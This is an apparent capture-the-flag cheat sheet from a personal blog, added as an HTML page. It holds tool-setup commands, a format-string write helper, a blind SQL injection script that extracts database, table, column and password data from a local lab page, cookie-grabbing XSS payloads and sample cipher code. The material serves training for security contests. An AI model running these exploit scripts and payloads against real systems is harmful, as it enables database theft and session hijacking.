@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>CTF CHEAT SHEET by AssassinQ | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctf">
+  
+  
+  
+  
+  <meta name="description" content="Some tips.">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF CHEAT SHEET by AssassinQ">
+<meta property="og:url" content="https://qianfei11.github.io/10007/06/11/CTF-CHEAT-SHEET-by-AssassinQ/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="Some tips.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-28T04:58:37.292Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF CHEAT SHEET by AssassinQ">
+<meta name="twitter:description" content="Some tips.">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css">
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  
+  <div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
+
+
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-CTF-CHEAT-SHEET-by-AssassinQ" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      CTF CHEAT SHEET by AssassinQ
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/10007/06/11/CTF-CHEAT-SHEET-by-AssassinQ/" class="article-date">
+	  <time datetime="+010007-06-10T20:40:39.000Z" itemprop="datePublished">June 11, 10007</time>
+	</a>
+
+       
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Some tips.</p>
+<a id="more"></a>
+<h1 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h1><h2 id="ZSH-Config"><a href="#ZSH-Config" class="headerlink" title="ZSH Config"></a>ZSH Config</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install curl git zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+<h2 id="Start-a-local-server-via-ncat"><a href="#Start-a-local-server-via-ncat" class="headerlink" title="Start a local server via ncat"></a>Start a local server via ncat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./vul -kl 127.0.0.1 8888</span><br></pre></td></tr></table></figure>
+<h2 id="Install-pwntools"><a href="#Install-pwntools" class="headerlink" title="Install pwntools"></a>Install pwntools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
+<h2 id="Install-GDB-plugins"><a href="#Install-GDB-plugins" class="headerlink" title="Install GDB plugins"></a>Install GDB plugins</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/peda.git ~/peda</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(offset, addr, val)</span>:</span></span><br><span class="line">	payload = <span class="string">''</span>.join(p32(addr + i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">	printed = len(payload)</span><br><span class="line">	fmt1 = <span class="string">'%&#123;&#125;c'</span></span><br><span class="line">	fmt2 = <span class="string">'%&#123;&#125;$hhn'</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		byte = (val &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">		addition = (byte - printed + <span class="number">256</span>) % <span class="number">256</span></span><br><span class="line">		<span class="keyword">if</span> addition &gt; <span class="number">0</span>:</span><br><span class="line">			payload += fmt1.format(str(addition))</span><br><span class="line">		payload += fmt2.format(str(offset + i))</span><br><span class="line">		printed += addition</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL-Injection-script"><a href="#SQL-Injection-script" class="headerlink" title="SQL Injection script"></a>SQL Injection script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">""</span> <span class="comment"># "http://127.0.0.1/sqli-labs-master/less-5/index.php?id="</span></span><br><span class="line">payload = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_databse</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Database: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Table names: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Column names: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Flag: "</span>, res)</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-payloads"><a href="#XSS-payloads" class="headerlink" title="XSS payloads"></a>XSS payloads</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br><span class="line">&lt;ScRipT&gt;alert(<span class="built_in">document</span>.cookie);&lt;/ScRipT&gt;</span><br><span class="line">&lt;img src=xss onerror=alert(<span class="built_in">document</span>.cookie)&gt;</span><br><span class="line">&lt;<span class="keyword">var</span> onmouseover=<span class="string">"prompt(1)"</span>&gt;On Mouse Over&lt;<span class="regexp">/var&gt;</span></span><br><span class="line"><span class="regexp">&lt;video src=1 onerror=alert(document.cookie)&gt;</span></span><br><span class="line"><span class="regexp">...</span></span><br></pre></td></tr></table></figure>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Substitution-ciphers"><a href="#Substitution-ciphers" class="headerlink" title="Substitution ciphers"></a>Substitution ciphers</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rahash2 -E rot -S s:14 -s <span class="string">'oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;\n'</span></span><br></pre></td></tr></table></figure>
+<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = DES.new(key, DES.MODE_ECB)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'AssassinQ_______'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<h2 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = Blowfish.new(key, Blowfish.MODE_ECB)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<h2 id="RC2"><a href="#RC2" class="headerlink" title="RC2"></a>RC2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC2</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = ARC2.new(key, ARC2.MODE_CFB, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = ARC2.new(key, ARC2.MODE_CFB, iv)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+<h2 id="CAST-128"><a href="#CAST-128" class="headerlink" title="CAST-128"></a>CAST-128</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> CAST</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = CAST.new(key, CAST.MODE_OPENPGP, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line"></span><br><span class="line">eiv = enc[:CAST.block_size + <span class="number">2</span>]</span><br><span class="line">obj = CAST.new(key, CAST.MODE_OPENPGP, eiv)</span><br><span class="line">plain = obj.decrypt(enc[CAST.block_size + <span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/24/杭电CTF-题库-reverse/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">杭电CTF-题库-reverse</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BASIC"><span class="nav-number">1.</span> <span class="nav-text">BASIC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ZSH-Config"><span class="nav-number">1.1.</span> <span class="nav-text">ZSH Config</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Start-a-local-server-via-ncat"><span class="nav-number">1.2.</span> <span class="nav-text">Start a local server via ncat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Install-pwntools"><span class="nav-number">1.3.</span> <span class="nav-text">Install pwntools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Install-GDB-plugins"><span class="nav-number">1.4.</span> <span class="nav-text">Install GDB plugins</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-String"><span class="nav-number">2.1.</span> <span class="nav-text">Format String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Free"><span class="nav-number">2.2.</span> <span class="nav-text">Double Free</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-script"><span class="nav-number">3.1.</span> <span class="nav-text">SQL Injection script</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-payloads"><span class="nav-number">3.2.</span> <span class="nav-text">XSS payloads</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Substitution-ciphers"><span class="nav-number">4.1.</span> <span class="nav-text">Substitution ciphers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RC4"><span class="nav-number">4.2.</span> <span class="nav-text">RC4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DES"><span class="nav-number">4.3.</span> <span class="nav-text">DES</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AES"><span class="nav-number">4.4.</span> <span class="nav-text">AES</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blowfish"><span class="nav-number">4.5.</span> <span class="nav-text">Blowfish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RC2"><span class="nav-number">4.6.</span> <span class="nav-text">RC2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CAST-128"><span class="nav-number">4.7.</span> <span class="nav-text">CAST-128</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
